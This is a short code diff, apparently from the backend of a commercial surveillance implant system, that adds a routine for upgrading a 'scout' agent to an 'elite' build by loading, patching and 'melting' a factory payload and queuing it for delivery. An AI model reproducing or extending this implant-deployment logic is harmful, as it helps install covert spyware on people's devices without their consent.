@@ -307,6 +307,9 @@ class Item
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
+    # if it's a scout, there a special procedure
+    return upgrade_scout if self.scout
+
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
     build.load({'_id' => factory._id})
@@ -338,6 +341,22 @@ class Item
 
     # always upgrade the core
     add_upgrade('core', File.join(build.tmpdir, 'core')) if File.exist? File.join(build.tmpdir, 'core')
+
+    build.clean
+
+    self.upgradable = true
+    self.save
+  end
+
+  def upgrade_scout
+    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+    build = RCS::DB::Build.factory(self.platform.to_sym)
+    build.load({'_id' => factory._id})
+    build.unpack
+    build.patch({'demo' => self.demo})
+    build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
+
+    add_upgrade('elite', File.join(build.tmpdir, 'output'))
 
     build.clean
 
